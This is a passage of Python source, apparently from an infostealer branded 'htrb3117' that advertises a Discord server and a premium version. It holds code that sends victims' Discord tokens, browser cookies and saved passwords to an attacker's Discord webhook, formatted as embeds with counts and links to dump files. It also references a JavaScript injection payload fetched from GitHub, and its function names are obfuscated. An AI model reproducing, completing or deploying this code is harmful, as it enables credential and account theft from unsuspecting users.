...
wh00k = "WEBHOOK HERE"
inj_url = "https://raw.githubusercontent.com/xvy0/ulol/main/injection/main/index.js"
...
def upl05dT4k31(t0k3n, path):
    ...
    if pfp == None: 
        pfp = "https://i.hizliresim.com/6t31tw2.jpg"
    else:
    ...
    data = {
        ...
        "embeds": [
            ...
            "footer": {
                "text": "discord.gg/revshit",
                "icon_url": "https://i.hizliresim.com/6t31tw2.jpg"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
        ...
        "avatar_url": "https://i.hizliresim.com/6t31tw2.jpg",
        "username": "htrb3117",
        "attachments": []
        }
...
def upload(name, link):
    ...
    if name == "crcook":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": "3117 | Cookies",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [htrb3117Cookies.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "discord.gg/revshit",
                        "icon_url": "https://i.hizliresim.com/6t31tw2.jpg"
    ...
    if name == "crpassw":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": "htrb3117 | Passwords",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [htrb3117Passwords.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "discord.gg/revshit",
                        "icon_url": "https://i.hizliresim.com/6t31tw2.jpg"
...
def wr1tef0rf1l3(data, name):
    ...
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<- Purchase htrb3117 Premium ->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")
